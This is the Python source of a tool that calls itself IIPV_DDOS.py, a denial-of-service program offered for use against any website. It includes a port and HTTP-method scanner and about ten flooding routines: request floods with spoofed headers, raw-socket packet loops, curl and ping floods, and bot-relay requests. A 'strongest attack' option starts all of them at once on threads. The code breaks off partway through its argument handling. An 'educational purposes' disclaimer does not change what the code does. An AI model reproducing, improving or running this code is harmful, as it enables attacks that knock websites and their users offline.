import requests,threading,queue,socket,json,os,random,time
from os import system,name
from optparse import OptionParser as OPTp


def my_ip(): # GLOBAL --> my_ip
    try:
        global my_ip
        my_host = socket.gethostname()
        my_ip = socket.gethostbyname(my_host)
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("CHECK YOUR INTERNET CONNECTION AND TRY AGAIN"))
        pass
    

def screen_clear():
    try:
        if name == "nt":
            _ = system("cls")      
        elif name == "posix":
            _ = system("clear")  
        else:
            _ = system("clear")
    except:
        pass


def read_file_doc(file_name=str):
    try:
        global x_file
        with open(file_name,"r") as file_tar:
            x_file = []
            for line_x in file_tar:
                try:
                    ext_tar = line_x.strip()
                    x_file.append(ext_tar)
                except:
                    pass
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("CHECK YOUR FILE AND TRY AGAIN"))
        pass
    

def build_char(size_pack=int):
    try:
        output_pack = ""
        for i_loop in range(0,size_pack):
            x_def = random.randint(120,160)
            output_pack += chr(x_def)
        return output_pack
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("SOMETHING IS WRONG"))
        pass


def check_possible_port(): # GLOBAL --> local_info,port_info
    try:
        global local_info,port_info
        c_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        c_socket.bind(("localhost",0))
        local_info,port_info = c_socket.getsockname()
        c_socket.close()
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("CHECK YOUR INTERNET CONNECTION AND TRY AGAIN"))
        pass
    

def get_ip_and_site(target_site=str): # GLOBAL --> target_ip_from_url,new_url
    try:
        global target_ip_from_url,new_url
        if "https://" in target_site or "http://" in target_site or target_site.endswith("/") == True:
            new_url = target_site.replace("https://","").replace("http://","").replace("/","")
            target_ip_from_url = socket.gethostbyname(new_url)
        else:
            new_url = target_site
            target_ip_from_url = socket.gethostbyname(new_url)
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("CHECK YOUR INTERNET CONNECTION AND TRY AGAIN"))
        pass


def simple_check(target_site=str,target_port=int): # GLOBAL --> res_ip_con,target_next_port_list
    try:
        global res_ip_con,target_next_port_list
        get_ip_and_site(target_site)
        sc_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        res_ip_con = sc_socket.connect_ex((target_ip_from_url,target_port))
        target_next_port_list = []
        if res_ip_con == 0:
            print("[+] %s --> \033[1;32m%s\x1b[0m : %s" % (target_ip_from_url,"PORT IS ACTIVE",str(target_port)))
            sc_socket.close()
            target_next_port_list.append(target_port)
        else:
            sc_socket.close()
            pass
        print("\n")
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("CHECK YOUR INTERNET CONNECTION AND TRY AGAIN"))
        pass
        
    

def simple_q(params_q,params_att):
    try:
        params_q.put(params_att)
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("CHECK YOUR INTERNET CONNECTION AND TRY AGAIN"))
        pass
        

def common_port_check(target_site=str):
    try:
        Port_List = [20,21,22,23,25,53,65,67,
                     68,69,80,101,102,105,107,
                     109,110,111,113,115,117,119,
                     123,137,138,139,143,161,162,
                     163,164,174,177,178,179,389,
                     443,444,500,535,611,631,636,
                     765,767,873,989,990,992,993,3389,
                     994,995,1433,1521,2049,2081,2083,2086,
                     3306,3389,5432,5500,5800,8200,8000,8080]
        get_ip_and_site(target_site)
        q = queue.Queue()
        for x_port in Port_List:
            simple_q(q,x_port)
        for x_q_range in range(q.qsize()):
            tar_port = q.get()
            t_thread = threading.Thread(target=simple_check,args=(target_site,tar_port))
            t_thread.start()
            q.task_done()
        q.join()
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("CHECK YOUR INTERNET CONNECTION AND TRY AGAIN"))
        pass

def common_method_check(target_site=str): # GLOBAL --> new_target_method,new_pre_method
    try:
        global new_target_method,new_pre_method
        print("\n")
        print("HTTPS:")
        print("\n")
        met_all_l = ["GET","POST","PUT",
                     "CONNECT","COPY","PATCH",
                     "TRACE","HEAD","UPDATE",
                     "LABEL","OPTIONS","MOVE",
                     "SEARCH","ARBITRARY","CHECKOUT",
                     "UNCHECKOUT","UNLOCK","MERGE",
                     "BASELINE-CONTROL","ACL"]
        get_ip_and_site(target_site)
        new_next_url = "https://"+target_site
        new_pre_url = "http://"+target_site
        new_target_method = []
        new_pre_method = []
        for x_x_m in met_all_l:
            command = os.popen("curl -s -I -X %s %s -m %s" % (x_x_m,new_next_url,30))
            try:
                status_code = command.read().split(" ")[1]
                if int(status_code) == 200:
                    print("[+] %s --> \033[1;32m%s\x1b[0m" % (x_x_m,status_code))
                    new_target_method.append(x_x_m)
                else:
                    print("[!] %s --> \033[1;33m%s\x1b[0m" % (x_x_m,status_code))
            except:
                print("[X] \033[1;31m%s\x1b[0m" % ("TOO MUCH TIMEOUT/COULD BE BLOCKED/CHECK YOUR SITE"))
                pass
        print("\n")
        print("HTTP:")
        print("\n")
        for x_x_m in met_all_l:
            command = os.popen("curl -s -I -X %s %s -m %s" % (x_x_m,new_pre_url,30))
            try:
                status_code = command.read().split(" ")[1]
                if int(status_code) == 200:
                    print("[+] %s --> \033[1;32m%s\x1b[0m" % (x_x_m,status_code))
                    new_pre_method.append(x_x_m)
                else:
                    print("[!] %s --> \033[1;33m%s\x1b[0m" % (x_x_m,status_code))
            except:
                print("[X] \033[1;31m%s\x1b[0m" % ("TOO MUCH TIMEOUT/COULD BE BLOCKED/CHECK YOUR SITE"))
                pass
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("CHECK YOUR INTERNET CONNECTION AND TRY AGAIN"))
        pass


def common_method_check_no_verbose(target_site=str): # GLOBAL --> new_target_method
    try:
        global new_target_method
        met_all_l = ["GET","POST","PUT",
                     "CONNECT","COPY","PATCH",
                     "TRACE","HEAD","UPDATE",
                     "LABEL","OPTIONS","MOVE",
                     "SEARCH","ARBITRARY","CHECKOUT",
                     "UNCHECKOUT","UNLOCK","MERGE",
                     "BASELINE-CONTROL","ACL"]
        get_ip_and_site(target_site)
        new_next_url = "https://"+target_site
        new_target_method = []
        for x_x_m in met_all_l:
            command = os.popen("curl -s -I -X %s %s -m %s" % (x_x_m,new_next_url,30))
            try:
                status_code = command.read().split(" ")[1]
                if int(status_code) == 200:
                    new_target_method.append(x_x_m)
                else:
                    pass
            except:
                pass
    except:
        pass    


def controlling_site(target_site=str,target_port=80): # GLOBAL --> c_status
    try:
        global c_status
        if "https://" in target_site or "http://" in target_site or target_site.endswith("/") == True:
            new_url = target_site.replace("https://","").replace("http://","").replace("/","")
            target_ip = socket.gethostbyname(new_url)
            c_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            c_socket.settimeout(12)
            c_status = c_socket.connect_ex((target_ip,target_port))
            c_socket.close()
            if c_status == 0:
                print("[+] \033[1;32m%s\x1b[0m" % ("SITE IS ACTIVE"))
                print("%s\033[1;32m%s\x1b[0m" % ("IP: ",target_ip))
                print("%s\033[1;32m%s\x1b[0m" % ("PORT: ",target_port))
            else:
                print("[!] \033[1;33m%s\x1b[0m" % ("SITE COULD NOT BE ACTIVE"))
                print("[!] \033[1;33m%s\x1b[0m" % ("CHECK YOUR PARAMETERS"))
                print("%s\033[1;33m%s\x1b[0m" % ("STATUS: ",c_status))
                
        else:
            target_ip = socket.gethostbyname(target_site)
            c_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            c_socket.settimeout(12)
            c_status = c_socket.connect_ex((target_ip,target_port))
            c_socket.close()
            if c_status == 0:
                print("[+] \033[1;32m%s\x1b[0m" % ("SITE IS ACTIVE"))
                print("%s\033[1;32m%s\x1b[0m" % ("IP: ",target_ip))
            else:
                print("[!] \033[1;33m%s\x1b[0m" % ("SITE COULD NOT BE ACTIVE"))
                print("[!] \033[1;33m%s\x1b[0m" % ("CHECK YOUR PARAMETERS"))
                print("%s\033[1;33m%s\x1b[0m" % ("STATUS: ",c_status))    
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("CHECK YOUR INTERNET CONNECTION AND TRY AGAIN"))
        pass


def user_agent_get(): # GLOBAL --> all_list_agent
    try:
        global all_list_agent
        Json_Tar="user_agent_all.json"
        f_op = open(Json_Tar)
        j_op = json.loads(f_op.read())
        all_list_agent = []
        for x_value in j_op["user_agents"]:
            for ix_values in j_op["user_agents"][x_value]:
                for ixl_values in j_op["user_agents"][x_value][ix_values]:
                    for ixlp_values in j_op["user_agents"][x_value][ix_values][ixl_values]:
                        all_list_agent.append(ixlp_values)
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("CHECK YOUR FILE DIRECTORY AND TRY AGAIN"))
        pass
    
    
# GLOBAL --> set_header,date_day,date_month,date_day_number,date_year
# GLOBAL --> date_time_x,date_time_y,date_time_z
def header_define():
    try:
        global set_header,date_day,date_month,date_day_number,date_year
        global date_time_x,date_time_y,date_time_z
        user_agent_get()
        read_file_doc("referer_list.txt")
        date_day = ["Mon","Tue","Wed","Thu","Fri","Sat","Sun"]
        date_month = ["Jan","Feb","Mar","Apr","Aug","Sep","Oct","Nov","Dec"]
        date_day_number = random.randint(1,30)
        date_year = random.randint(2000,2021)
        date_time_x = random.randint(10,23)
        date_time_y = random.randint(10,50)
        date_time_z = random.randint(10,55)
        random_user_agent = random.choice(all_list_agent)
        set_header = {"User-Agent":random_user_agent,
                      "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                      "Connection":"Keep-Alive",
                      "Keep-Alive":"155",
                      "Content-Type":"text/html",
                      "Accept-Encoding":"gzip,deflate",
                      "Accept-Language":"en-us,en;q=0.5",
                      "Accept-Charset":"ISO-8859-1,utf-8;q=0.7,*;q=0.7",
                      "Referer":f"{random.choice(x_file)}{build_char(random.randint(5,10))}",
                      "Date":f"{random.choice(date_day)}, {date_day_number} {random.choice(date_month)} {date_year} {date_time_x}:{date_time_y}:{date_time_z} GMT"}
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("TARGET MAY BE DESTROYED"))
        pass


def ds_style_one(target_url):
    try:
        while True:
            header_define()
            if "https://" in target_url or "http://" in target_url:
                rq_session = requests.Session()
                rq_session.get(target_url,headers=set_header)
                rq_session.close()
                print("-> \033[1;32m%s\x1b[0m" % ("RQ ATTACK SENDING"))
            else:
                new_url = "http://"+target_url
                rq_session = requests.Session()
                rq_session.get(new_url,headers=set_header)
                rq_session.close()
                print("-> \033[1;35m%s\x1b[0m" % ("RQ ATTACK SENDING"))
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("CONNECTION TERMINATED, TARGET MAY BE DESTROYED"))
        pass
    

def ds_style_two(target_url=str,target_port=int):
    try:
        while True:
            header_define()
            user_agent_get()
            read_file_doc("referer_list.txt")
            get_ip_and_site(target_url)
            data_packing = f"""
User-Agent: {random.choice(all_list_agent)}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
Referer: {random.choice(x_file)}{build_char(random.randint(5,10))}
Keep-Alive: 155
Connection: Keep-Alive
Date: {random.choice(date_day)}, {date_day_number} {random.choice(date_month)} {date_year} {date_time_x}:{date_time_y}:{date_time_z} GMT
Content-Type: text/html"""
            sending_packet = "GET / HTTP/1.1\nHost: "+new_url+"\n"+data_packing
            s_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s_socket.connect((new_url,target_port))
            if s_socket.sendto(sending_packet.encode(),(new_url,target_port)):
                s_socket.shutdown(1)
                print("-> \033[1;32m%s\x1b[0m" % ("PACKAGE ATTACK SENDING"))
            else:
                s_socket.shutdown(1)
                print("[!] \033[1;33m%s\x1b[0m" % ("CONNECTION TERMINATED, TARGET MAY BE DESTROYED"))
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("CONNECTION TERMINATED, TARGET MAY BE DESTROYED"))
        pass
    

def ds_style_three(target_url=str,target_port=int):
    try:
        while True:
            header_define()
            user_agent_get()
            get_ip_and_site(target_url)
            s_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            try:
                s_socket.connect((new_url,target_port))
                s_socket.shutdown(1)
                print("-> \033[1;32m%s\x1b[0m" % ("CONNECTION ATTACK SENDING"))
            except:
                s_socket.shutdown(1)
                print("[!] \033[1;33m%s\x1b[0m" % ("CONNECTION TERMINATED, TARGET MAY BE DESTROYED"))
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("CONNECTION TERMINATED, TARGET MAY BE DESTROYED"))
        pass
    

def ds_style_four(target_url=str):
    try:
        while True:
            if "http://" in target_url:
                new_url = target_url.replace("http://","").replace(" ","").replace("www.","")
                new_url = "https://"+new_url
                command_att = "curl -s -k %s -m %s" % (new_url,12)
                os.popen(command_att)
                print("-> \033[1;32m%s\x1b[0m" % ("CURL ATTACK SENDING"))
            elif "https://" in target_url:
                target_url = target_url.replace("www.","").replace(" ","")
                command_att = "curl -s -k %s -m %s" % (target_url,12)
                os.popen(command_att)
                print("-> \033[1;32m%s\x1b[0m" % ("CURL ATTACK SENDING"))
            else:
                new_url = target_url.replace("http://","").replace(" ","").replace("www.","")
                new_url = "https://"+new_url
                command_att = "curl -s -k %s -m %s" % (new_url,12)
                os.popen(command_att)
                print("-> \033[1;32m%s\x1b[0m" % ("CURL ATTACK SENDING"))
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("CONNECTION TERMINATED, TARGET MAY BE DESTROYED"))
        pass
        
        

def ds_style_five(target_url=str):
    try:
        while True:
            user_agent_get()
            random_user_agent = random.choice(all_list_agent)
            agent_define = f"User-Agent: {random_user_agent}"
            if "http://" in target_url:
                new_url = target_url.replace("http://","").replace(" ","").replace("www.","")
                new_url = "https://"+new_url
                command_att = "curl -s %s -H %s -m %s" % (new_url,agent_define,40)
                os.popen(command_att)
                print("-> \033[1;32m%s\x1b[0m" % ("CURL -H ATTACK SENDING"))
            elif "https://" in target_url:
                target_url = target_url.replace("www.","").replace(" ","")
                command_att = "curl -s %s -H %s -m %s" % (target_url,agent_define,40)
                os.popen(command_att)
                print("-> \033[1;32m%s\x1b[0m" % ("CURL -H ATTACK SENDING"))
            else:
                new_url = target_url.replace("http://","").replace(" ","").replace("www.","")
                new_url = "https://"+new_url
                command_att = "curl -s %s -H %s -m %s" % (new_url,agent_define,40)
                os.popen(command_att)
                print("-> \033[1;32m%s\x1b[0m" % ("CURL -H ATTACK SENDING"))
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("CONNECTION TERMINATED, TARGET MAY BE DESTROYED"))
        pass
    

def ds_style_six(target_url=str):
    try:
        while True:
            if "http://" in target_url:
                new_url = target_url.replace("http://","").replace(" ","").replace("www.","")
                new_url = "https://"+new_url
                command_att = "curl -sX HEAD %s -m %s" % (new_url,40)
                os.popen(command_att)
                print("-> \033[1;32m%s\x1b[0m" % ("CURL -X ATTACK SENDING"))
            elif "https://" in target_url:
                target_url = target_url.replace("www.","").replace(" ","")
                command_att = "curl -sX HEAD %s -m %s" % (target_url,40)
                os.popen(command_att)
                print("-> \033[1;32m%s\x1b[0m" % ("CURL -X ATTACK SENDING"))
            else:
                new_url = target_url.replace("http://","").replace(" ","").replace("www.","")
                new_url = "https://"+new_url
                command_att = "curl -sX HEAD %s -m %s" % (new_url,40)
                os.popen(command_att)
                print("-> \033[1;32m%s\x1b[0m" % ("CURL -X ATTACK SENDING"))
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("CONNECTION TERMINATED, TARGET MAY BE DESTROYED"))
        pass


def ds_style_seven(target_url=str): # DANGER
    try:
        read_file_doc("req_header.txt")
        while True:
            if "http://" in target_url:
                new_url = target_url.replace("http://","").replace(" ","").replace("www.","")
                new_url = "https://"+new_url
                get_ip_and_site(new_url)
                for x_acc in x_file:
                    try:
                        command_att = "curl %s:80 -s -H '%s: ' -m %s" % (target_ip_from_url,x_acc,40)
                        os.popen(command_att)
                        print("-> \033[1;32m%s\x1b[0m" % ("CURL -A ATTACK SENDING"))
                    except:
                        pass
                screen_clear()
            elif "https://" in target_url:
                target_url = target_url.replace("www.","").replace(" ","")
                get_ip_and_site(target_url)
                for x_acc in x_file:
                    try:
                        command_att = "curl %s:80 -s -H '%s: ' -m %s" % (target_ip_from_url,x_acc,40)
                        os.popen(command_att)
                        print("-> \033[1;32m%s\x1b[0m" % ("CURL -A ATTACK SENDING"))
                    except:
                        pass
                screen_clear()
            else:
                new_url = target_url.replace("http://","").replace(" ","").replace("www.","")
                new_url = "https://"+new_url
                get_ip_and_site(new_url)
                for x_acc in x_file:
                    try:
                        command_att = "curl %s:80 -s -H '%s: ' -m %s" % (target_ip_from_url,x_acc,40)
                        os.popen(command_att)
                        print("-> \033[1;32m%s\x1b[0m" % ("CURL -A ATTACK SENDING"))
                    except:
                        pass
                screen_clear()
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("CONNECTION TERMINATED, TARGET MAY BE DESTROYED"))
        pass
    

def ds_style_eight(target_url=str):
    try:
        while True:
            if "http://" in target_url or "https://" in target_url:
                new_url = target_url.replace("https://","").replace("http://","").replace("www.","").replace(" ","")
                if name == "nt":
                    command_att = "ping %s -l %s" % (new_url,1024)
                    os.popen(command_att)
                    print("-> \033[1;32m%s\x1b[0m" % ("PING ATTACK SENDING"))
                else:
                    command_att = "ping %s -s %s" % (new_url,1024)
                    os.popen(command_att)
                    print("-> \033[1;32m%s\x1b[0m" % ("PING ATTACK SENDING"))
            else:
                new_url = target_url.replace("https://","").replace("http://","").replace("www.","").replace(" ","")
                if name == "nt":
                    command_att = "ping %s -l %s" % (new_url,1024)
                    os.popen(command_att)
                    print("-> \033[1;32m%s\x1b[0m" % ("PING ATTACK SENDING"))
                else:
                    command_att = "ping %s -s %s" % (new_url,1024)
                    os.popen(command_att)
                    print("-> \033[1;32m%s\x1b[0m" % ("PING ATTACK SENDING"))
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("CONNECTION TERMINATED, TARGET MAY BE DESTROYED"))
        pass


def ds_style_nine(target_url=str):
    try:
        common_method_check_no_verbose(target_url)
        while True:
            if "http://" in target_url:
                new_url = target_url.replace("http://","").replace(" ","").replace("www.","")
                new_url = "https://"+new_url
                for x_meth in new_target_method:
                    command_att = "curl -sX %s %s -m %s" % (str(x_meth),new_url,40)
                    os.popen(command_att)
                    print("-> \033[1;32m%s\x1b[0m" % ("CURL -XH ATTACK SENDING"))
            elif "https://" in target_url:
                new_url = target_url.replace("www.","").replace(" ","")
                for x_meth in new_target_method:
                    command_att = "curl -sX %s %s -m %s" % (str(x_meth),new_url,40)
                    os.popen(command_att)
                    print("-> \033[1;32m%s\x1b[0m" % ("CURL -XH ATTACK SENDING"))
            else:
                new_url = target_url.replace("http://","").replace(" ","").replace("www.","")
                new_url = "https://"+new_url
                for x_meth in new_target_method:
                    command_att = "curl -sX %s %s -m %s" % (str(x_meth),new_url,40)
                    os.popen(command_att)
                    print("-> \033[1;32m%s\x1b[0m" % ("CURL -XH ATTACK SENDING"))
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("CONNECTION TERMINATED, TARGET MAY BE DESTROYED"))
        pass
    

def ds_bot_one(target_url=str):
    try:
        while True:
            read_file_doc("bot_list_add.txt")
            user_agent_get()
            if "https://" in target_url or "http://" in target_url:
                new_url = target_url.replace("https://","").replace("http://","").replace("www.","")
                for x_b in x_file:
                    try:
                        User_Header = {
                                "User-Agent":f"{random.choice(all_list_agent)}"
                                }
                        main_url = x_b.replace("{site}",new_url)
                        req_new = requests.Session()
                        con_put = req_new.get(main_url,headers=User_Header,timeout=32)
                        con_put.close()
                        print("-> \033[1;32m%s\x1b[0m" % ("BOT ATTACK SENDING"))
                    except:
                        pass
            else:
                new_url = target_url.replace("https://","").replace("http://","").replace("www.","")
                for x_b in x_file:
                    try:
                        User_Header = {
                                "User-Agent":f"{random.choice(all_list_agent)}"
                                }
                        main_url = x_b.replace("{site}",new_url)
                        req_new = requests.Session()
                        con_put = req_new.get(main_url,headers=User_Header,timeout=32)
                        con_put.close()
                        print("-> \033[1;32m%s\x1b[0m" % ("BOT ATTACK SENDING"))
                    except:
                        pass
    except:
        print("[X] \033[1;31m%s\x1b[0m" % ("CONNECTION TERMINATED, TARGET MAY BE DESTROYED"))
        pass
    

def show_warning():
    try:
        print("\033[1;33m%s\x1b[0m" % ("""
                                       
                 ############################################################################################################
                 ############################################################################################################
                                 
                 PLEASE CHECK YOUR INTENDED USE AND IP PRIVACY
                 YOU MAY HAVE TO APPLY FORCED OFF
                 [!] ATTACK WILL BE STARTED [!]
                                 
                 ############################################################################################################
                 ############################################################################################################
    
                                       """))
    except:
        pass

def show_info():
    try:
        print("""
              
              
         IIIIIIIIIIIIIIIIIIII        PPPPPPPPPPPPPPPPP        VVVVVVVV           VVVVVVVV
         I::::::::II::::::::I        P::::::::::::::::P       V::::::V           V::::::V
         I::::::::II::::::::I        P::::::PPPPPP:::::P      V::::::V           V::::::V
         II::::::IIII::::::II        PP:::::P     P:::::P     V::::::V           V::::::V
           I::::I    I::::I            P::::P     P:::::P      V:::::V           V:::::V 
           I::::I    I::::I            P::::P     P:::::P       V:::::V         V:::::V  
           I::::I    I::::I            P::::PPPPPP:::::P         V:::::V       V:::::V   
           I::::I    I::::I            P:::::::::::::PP           V:::::V     V:::::V    
           I::::I    I::::I            P::::PPPPPPPPP              V:::::V   V:::::V     
           I::::I    I::::I            P::::P                       V:::::V V:::::V      
           I::::I    I::::I            P::::P                        V:::::V:::::V       
           I::::I    I::::I            P::::P                         V:::::::::V        
         II::::::IIII::::::II        PP::::::PP                        V:::::::V         
         I::::::::II::::::::I ...... P::::::::P                         V:::::V          
         I01000110II00110100I .::::. P01000110P                          V:::V     --> CREATED FOR FREE NET 
         IIIIIIIIIIIIIIIIIIII ...... PPPPPPPPPP                           VVV      --> open-source culture
              
             ############################################################################################################
             ############################################################################################################
             -------------------------------------------------------------------------------------
             
             py IIPV_DDOS.py -<TYPE> https://example.com  [or] py IIPV_DDOS.py --<TYPE>  https://example.com 
    
             -------------------------------------------------------------------------------------
             ############################################################################################################
             ############################################################################################################
              
              -------------------------------------------------------------------------------------
              ####   -H    --help             how to use   ####
              
              [ -p ]  --pentesting          -> CHECK OPEN PORTS AND WEB SERVER METHODS
              [ -d ]  --ddos                -> START MAIN ATTACK
              [ -x ]  --strong              -> START THE STRONGEST ATTACK
              [ -o ]  --curlone             -> START THE TYPE ONE ATTACK
              [ -t ]  --curltwo             -> START THE TYPE TWO ATTACK
              [ -r ]  --curlthree           -> START THE TYPE THREE ATTACK
              [ -f ]  --curlfour            -> START THE TYPE FOUR ATTACK
              [ -v ]  --curlfive            -> START THE TYPE FIVE ATTACK
              [ -s ]  --curlsix             -> START THE TYPE SIX ATTACK
              [ -b ]  --botattack           -> START THE BOT ATTACK
              
              -------------------------------------------------------------------------------------
              
              
              <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
              -------------------------------------------------------------------------------------
              [NOTED - IMPORTANT]
              + USE FOR EDUCATIONAL PURPOSES
              + PERFORMANCE DEPENDS ON YOUR COMPUTER POWER AND INTERNET CAPACITY
              + THE MOSTLY SELECTED DEFAULT PORT IS 80
              + CODE OWNER IS NOT RESPONSIBLE FOR MISUSE
              -------------------------------------------------------------------------------------
              >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
              
              <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
              -------------------------------------------------------------------------------------
              [RECOMMENDATION]
              + MAKE SURE YOU HAVE STRONG COMPUTER CORE AND INTERNET NETWORK CAPACITY FOR <--strong>
              + THE CODE OWNER IS NOT RESPONSIBLE FOR DAMAGES ARISING FROM <--strong>
              + ATTACK EFFICIENCY INCREASES DUE TO THE PORT VARIABLE
              + MAKE SURE OF YOUR NETWORK PRIVACY
              + DO NOT USE IF IN DOUBT
              -------------------------------------------------------------------------------------
              >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    
              
              
              """)
    except:
        pass

def main_running():
    try:
        QT_Process = OPTp(add_help_option=False,epilog="DDoS & MORE")
        QT_Process.add_option("-H",
                              "--help",
                              help="FOR HELP",
                              action="store_true",
                              dest="x_help")
        QT_Process.add_option("-p",
                              "--pentesting",
                              help="CHECK OPEN PORTS AND WEB SERVER METHODS",
                              type="string",
                              dest="x_pent")
        QT_Process.add_option("-d",
                              "--ddos",
                              help="START MAIN ATTACK",
                              type="string",
                              dest="x_main")
        QT_Process.add_option("-x",
                              "--strong",
                              help="START THE STRONGEST ATTACK",
                              type="string",
                              dest="x_strong")
        QT_Process.add_option("-o",
                              "--curlone",
                              help="START THE TYPE ONE ATTACK",
                              type="string",
                              dest="x_curl_one")
        QT_Process.add_option("-t",
                              "--curltwo",
                              help="START THE TYPE TWO ATTACK",
                              type="string",
                              dest="x_curl_two")
        QT_Process.add_option("-r",
                              "--curlthree",
                              help="START THE TYPE THREE ATTACK",
                              type="string",
                              dest="x_curl_three")
        QT_Process.add_option("-f",
                              "--curlfour",
                              help="START THE TYPE FOUR ATTACK",
                              type="string",
                              dest="x_curl_four")
        QT_Process.add_option("-v",
                              "--curlfive",
                              help="START THE TYPE FIVE ATTACK",
                              type="string",
                              dest="x_curl_five")
        QT_Process.add_option("-s",
                              "--curlsix",
                              help="START THE TYPE SIX ATTACK",
                              type="string",
                              dest="x_curl_six")
        QT_Process.add_option("-b",
                              "--botattack",
                              help="START THE BOT ATTACK",
                              type="string",
                              dest="x_bot")
        arq_run,arq_add = QT_Process.parse_args()
        if arq_run.x_pent:
            show_warning()
            print("\n")
            time.sleep(1.2)
            site_target = str(arq_run.x_pent).replace(" ","")
            time.sleep(1.2)
            controlling_site(site_target)
            print("\n")
            time.sleep(1.2)
            common_method_check(site_target)
            print("\n")
            time.sleep(1.2)
            common_port_check(site_target)
            print("\n")
        elif arq_run.x_main:
            site_target = str(arq_run.x_main).replace(" ","")
            print("\n")
            user_ask = str(input("DO YOU WANT TO SPECIFY A PORT [Y/N /ANY KEY TO EXIT]: ")).upper().replace(" ","")
            print("\n")
            if user_ask == "Y":
                try:
                    port_ask = int(input("TYPE YOUR PORT: "))
                    print("\n")
                    show_warning()
                    time.sleep(4.2)
                    the_1 = threading.Thread(target=ds_style_one,args=(site_target, ))
                    the_2 = threading.Thread(target=ds_style_two,args=(site_target,port_ask))
                    the_3 = threading.Thread(target=ds_style_three,args=(site_target,port_ask))
                    the_1.start()
                    the_2.start()
                    the_3.start()
                except:
                    print("[X] \033[1;31m%s\x1b[0m" % ("MAKE SURE YOU TYPE THE CORRECT PARAMETER"))
                    pass
            elif user_ask == "N":
                show_warning()
                time.sleep(4.2)
                the_1 = threading.Thread(target=ds_style_one,args=(site_target, ))
                the_2 = threading.Thread(target=ds_style_two,args=(site_target,80))
                the_3 = threading.Thread(target=ds_style_three,args=(site_target,80))
                the_1.start()
                the_2.start()
                the_3.start()
            else:
                print("[X] \033[1;33m%s\x1b[0m" % ("PROCESS TERMINATED"))
                print("\n")
                pass
                
        elif arq_run.x_strong:
            site_target = str(arq_run.x_strong).replace(" ","")
            print("\n")
            user_ask = str(input("DO YOU WANT TO SPECIFY A PORT [Y/N /ANY KEY TO EXIT]: ")).upper().replace(" ","")
            print("\n")
            if user_ask == "Y":
                try:
                    port_ask = int(input("TYPE YOUR PORT: "))
                    print("\n")
                    show_warning()
                    time.sleep(4.2)
                    the_1 = threading.Thread(target=ds_style_one,args=(site_target, ))
                    the_2 = threading.Thread(target=ds_style_two,args=(site_target,port_ask))
                    the_3 = threading.Thread(target=ds_style_three,args=(site_target,port_ask))
                    the_4 = threading.Thread(target=ds_style_four,args=(site_target, ))
                    the_5 = threading.Thread(target=ds_style_five,args=(site_target, ))
                    the_6 = threading.Thread(target=ds_style_six,args=(site_target, ))
                    the_7 = threading.Thread(target=ds_style_seven,args=(site_target, ))
                    the_8 = threading.Thread(target=ds_style_eight,args=(site_target, ))
                    the_9 = threading.Thread(target=ds_style_nine,args=(site_target, ))
                    bot_1 = threading.Thread(target=ds_bot_one,args=(site_target, ))
                    the_1.start()
                    the_2.start()
                    the_3.start()
                    the_4.start()
                    the_5.start()
                    the_6.start()
                    the_7.start()
                    the_8.start()
                    the_9.start()
                    bot_1.start()
                except:
                    print("[X] \033[1;31m%s\x1b[0m" % ("MAKE SURE YOU TYPE THE CORRECT PARAMETER"))
                    pass
            elif user_ask == "N":
                show_warning()
                time.sleep(4.2)
                the_1 = threading.Thread(target=ds_style_one,args=(site_target, ))
                the_2 = threading.Thread(target=ds_style_two,args=(site_target,80))
                the_3 = threading.Thread(target=ds_style_three,args=(site_target,80))
                the_4 = threading.Thread(target=ds_style_four,args=(site_target, ))
                the_5 = threading.Thread(target=ds_style_five,args=(site_target, ))
                the_6 = threading.Thread(target=ds_style_six,args=(site_target, ))
                the_7 = threading.Thread(target=ds_style_seven,args=(site_target, ))
                the_8 = threading.Thread(target=ds_style_eight,args=(site_target, ))
                the_9 = threading.Thread(target=ds_style_nine,args=(site_target, ))
                bot_1 = threading.Thread(target=ds_bot_one,args=(site_target, ))
                the_1.start()
                the_2.start()
                the_3.start()
                the_4.start()
                the_5.start()
                the_6.start()
                the_7.start()
                the_8.start()
                the_9.start()
                bot_1.start()
            else:
                print("[X] \033[1;33m%s\x1b[0m" % ("PROCESS TERMINATED"))
                print("\n")
                pass
        elif arq_run.x_curl_one:
            show_warning()
            time.sleep(4.2)
